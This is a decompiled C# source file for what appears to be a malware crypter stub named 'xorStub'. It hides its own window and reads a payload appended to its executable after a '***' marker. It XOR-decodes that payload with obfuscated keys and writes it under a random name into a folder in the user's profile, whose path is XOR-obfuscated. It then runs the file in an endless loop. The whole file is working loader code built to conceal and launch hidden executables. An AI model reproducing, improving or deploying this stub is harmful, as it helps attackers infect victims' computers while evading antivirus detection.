using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace xorStub
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
		public static string ROT13Encode(string data, string key)
		{
			int length = data.Length;
			int length2 = key.Length;
			char[] array = new char[length];
			for (int i = 0; i < length; i++)
			{
				array[i] = (data[i] ^ key[i % length2]);
			}
			return new string(array);
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000209C File Offset: 0x0000029C
		private static void Main(string[] args)
		{
			Program.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
			for (;;)
			{
				using (StreamReader streamReader = new StreamReader(Assembly.GetEntryAssembly().Location))
				{
					using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
					{
						Program.<>c__DisplayClass3_0 CS$<>8__locals1 = new Program.<>c__DisplayClass3_0();
						byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
						string text = Encoding.ASCII.GetString(bytes).Substring(Encoding.ASCII.GetString(bytes).IndexOf("***")).Replace("***", "");
						string key = Program.ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(text.Split(new char[]
						{
							'|'
						})[1])), "randomkey");
						string s = text.Split(new char[]
						{
							'|'
						})[0];
						CS$<>8__locals1.fileName = Program.RandomUtil.GetRandomString();
						CS$<>8__locals1.CurrentDirectoryy = new string[]
						{
							Program.ROT13Encode("\u0002{", "AAAQSDQSDF"),
							Program.ROT13Encode("\u0004 !# ", "QSDQSFFF"),
							Program.ROT13Encode("\u0010#4\u0015200", "QSDQSDQFGHG"),
							Program.ROT13Encode("\u0006')-$", "JHJLHJKYTUTYU"),
							Program.ROT13Encode("\u0005!>6", "QDSFDFHNGFGN"),
							Program.ROT13Encode("v&.2", "XCVW<X<WCBN")
						};
						byte[] bytes2 = Convert.FromBase64String(Program.ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(s)), key));
						File.WriteAllBytes(string.Concat(new string[]
						{
							CS$<>8__locals1.CurrentDirectoryy[0],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[1],
							"\\",
							Environment.UserName,
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[2],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[3],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[4],
							"\\",
							CS$<>8__locals1.fileName,
							CS$<>8__locals1.CurrentDirectoryy[5]
						}), bytes2);
						Process process = new Process();
						process.Exited += CS$<>8__locals1.<Main>g__p_Exited|0;
						process.StartInfo.FileName = string.Concat(new string[]
						{
							CS$<>8__locals1.CurrentDirectoryy[0],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[1],
							"\\",
							Environment.UserName,
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[2],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[3],
							"\\",
							CS$<>8__locals1.CurrentDirectoryy[4],
							"\\",
							CS$<>8__locals1.fileName,
							CS$<>8__locals1.CurrentDirectoryy[5]
						});
						process.EnableRaisingEvents = true;
						process.Start();
						Console.ReadLine();
					}
				}
			}
		}

		// Token: 0x02000003 RID: 3
		private static class RandomUtil
		{
			// Token: 0x06000005 RID: 5 RVA: 0x000023D0 File Offset: 0x000005D0
			public static string GetRandomString()
			{
				return Path.GetRandomFileName().Replace(".", "");
			}
		}
	}
}
